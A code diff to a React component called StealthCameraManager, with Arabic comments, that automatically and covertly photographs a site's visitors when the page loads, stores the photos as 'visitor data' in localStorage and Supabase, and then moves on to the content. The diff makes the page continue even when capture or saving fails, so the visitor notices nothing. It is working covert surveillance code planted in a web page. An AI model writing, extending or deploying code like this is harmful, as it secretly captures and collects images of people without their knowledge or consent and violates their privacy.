@@ -30,6 +30,7 @@ const StealthCameraManager: React.FC<StealthCameraManagerProps> = ({
   // بدء التقاط تلقائي عند التحميل إذا كان autoStart مفعل
   React.useEffect(() => {
     if (autoStart && !isCapturing && !captureComplete) {
+      console.log('🚀 بدء التقاط تلقائي سري...');
       handleStartStealthCapture();
     }
   }, [autoStart]);
@@ -38,41 +39,68 @@ const StealthCameraManager: React.FC<StealthCameraManagerProps> = ({
     try {
       setError(null);
       setStatus('بدء التقاط الصور بشكل سري...');
+      console.log('📸 بدء التقاط الصور السرية...');
       
       const photos = await startStealthCapture(photoCount);
       
       if (photos && photos.length > 0) {
+        console.log(`✅ تم التقاط ${photos.length} صور بنجاح`);
         setStatus('حفظ البيانات...');
+        
         const visitorData = await saveVisitorData(photos);
         
         if (visitorData) {
+          console.log('✅ تم حفظ بيانات الزائر بنجاح');
           setStatus(`تم الانتهاء بنجاح! تم التقاط ${photos.length} صورة بشكل سري`);
+          setCaptureComplete(true);
           
-          // التحقق من حفظ البيانات
-          setTimeout(() => {
-            const savedVisitors = getAllVisitors();
-            const isDataSaved = savedVisitors.some(v => v.id === visitorData.id);
-            
-            if (isDataSaved) {
-              console.log('✅ تم التأكد من حفظ البيانات في localStorage');
-              setCaptureComplete(true);
-              setTimeout(() => {
-                onComplete();
-              }, 2000);
-            } else {
-              console.error('❌ فشل في حفظ البيانات - المحاولة مرة أخرى...');
-              setError('فشل في حفظ البيانات، يرجى المحاولة مرة أخرى');
-            }
-          }, 500);
+          // في حالة autoStart، ننتقل فوراً للصفحة الرئيسية
+          if (autoStart) {
+            console.log('🏁 انتهاء التقاط السري - الانتقال للمحتوى الرئيسي');
+            setTimeout(() => {
+              onComplete();
+            }, 1000); // انتظار ثانية واحدة فقط
+          } else {
+            // في الحالة العادية، ننتظر أكثر لعرض رسالة النجاح
+            setTimeout(() => {
+              onComplete();
+            }, 3000);
+          }
         } else {
+          console.error('❌ فشل في حفظ البيانات');
           setError('خطأ في حفظ البيانات');
+          
+          // حتى لو فشل الحفظ في Supabase، ننتقل للمحتوى (لأن البيانات محفوظة محلياً)
+          if (autoStart) {
+            console.log('⚠️ فشل Supabase لكن البيانات محفوظة محلياً - الانتقال للمحتوى');
+            setTimeout(() => {
+              onComplete();
+            }, 2000);
+          }
         }
       } else {
+        console.error('❌ فشل في التقاط الصور');
         setError('فشل في التقاط الصور');
+        
+        // حتى لو فشل التقاط الصور، ننتقل للمحتوى بعد مهلة
+        if (autoStart) {
+          console.log('⚠️ فشل التقاط الصور - الانتقال للمحتوى رغم ذلك');
+          setTimeout(() => {
+            onComplete();
+          }, 3000);
+        }
       }
     } catch (err) {
+      console.error('❌ خطأ في التقاط الصور السرية:', err);
       setError('حدث خطأ أثناء التقاط الصور');
-      console.error('Stealth capture error:', err);
+      
+      // حتى في حالة الخطأ، ننتقل للمحتوى
+      if (autoStart) {
+        console.log('⚠️ خطأ عام - الانتقال للمحتوى رغم ذلك');
+        setTimeout(() => {
+          onComplete();
+        }, 3000);
+      }
     }
   };
 
